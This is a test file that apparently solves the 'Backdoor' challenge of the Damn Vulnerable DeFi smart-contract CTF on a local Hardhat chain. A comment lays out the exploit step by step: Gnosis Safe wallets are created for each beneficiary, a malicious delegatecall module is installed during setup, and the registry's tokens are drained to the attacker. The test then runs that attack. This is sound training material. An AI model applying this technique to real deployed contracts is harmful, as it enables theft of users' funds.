const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
    let deployer, users, attacker;

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Deploy the registry
        this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            this.masterCopy.address,
            this.walletFactory.address,
            this.token.address,
            users
        );

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.true;            
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    /** Note: A lot of the logic in this exploit was found online, but I made sure I understood the exploit fully 
     * Logic: We can create a Gnosis safe with anyone as the owner ==> we can create a safe on the behalf of the beneficiaries,
     * and ensaure the factory calls back to the WalletRegistry contract. During call back the contract will transfer 10 dvt to the Gnosis safe
     * Since it is solely owned by one of the beneficiaries ==> we will be unable to access the funds
     * Workaround: We can install a backdoor into the Gnosis safe on initialization which won't require the sig's of the owners only on deployment
     * Steps:
     * 1.) Deploy BackdoorAttack Contract
     * 2.) Generate abi to call the setupToken() in the BackDoorAttack contract
     * 3.) Call exploit() with ABI and the list of users in the registry
     * 4.) exploit() will generate ABI to setup new Gnosis wallet with prior ABI with callback address and function to be wallet registry
     * 5.) exploit() Call the ProxyFactory contract with previous ABI with a callback to the WalletRegistry proxyCreated() function. 
     * 6.) createProxyWithCallback() will deploy a new proxy and call the setup() method on the proxy
     * -> 7.) setup() Setup the new proxy and set up the module calling back to the malicious contract as a delegate call executed in the context of the new proxy contract
     * -> 8.) setupToken() Approve 10 ETH from attacker contract to be spent
     * -> 9.) proxyCreated() Execute callback on the wallet registry to pass checks and transfer 10 eth to newly created wallet
     * 10.) exploit() Transfer the 10 ETH from the Gnosis wallet to the attacker address and repeat for each beneficiary within the contract in 1 transaction
     */
    it('Exploit', async function () {
        const attackToken = this.token.connect(attacker);
        const attackFactory = this.walletFactory.connect(attacker);
        const attackMasterCopy = this.masterCopy.connect(attacker);
        const attackWalletRegistry = this.walletRegistry.connect(attacker);

        // Helper Function
        const checkTokenBalance = async (address, name) => {
            const tokenBal = await attackToken.balanceOf(address);
            console.log(`TOKEN Balance of ${name}`, ethers.utils.formatEther(tokenBal));
        }

        await checkTokenBalance(attacker.address, "Attacker");

        // Deploy attacking contract
        const AttackModuleFactory = await ethers.getContractFactory("BackdoorAttack", attacker);
        const attackModule = await AttackModuleFactory.deploy(
            attacker.address,
            attackFactory.address,
            attackMasterCopy.address,
            attackWalletRegistry.address,
            attackToken.address
        );
        

        // ABI call to setupToken() which is malicious
        const moduleABI = ["function setupToken(address _tokenAddress, address _attacker)"];
        const moduleIFace = new ethers.utils.Interface(moduleABI);
        const setupData = moduleIFace.encodeFunctionData("setupToken", [
            attackToken.address, 
            attackModule.address
        ])

        // Do exploit in one transaction (after contract deployment)
        await attackModule.exploit(users, setupData);
          
        await checkTokenBalance(attacker.address, "Attacker");
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i]);
            
            // User must have registered a wallet
            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");

            // User is no longer registered as a beneficiary
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Attacker must have taken all tokens
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
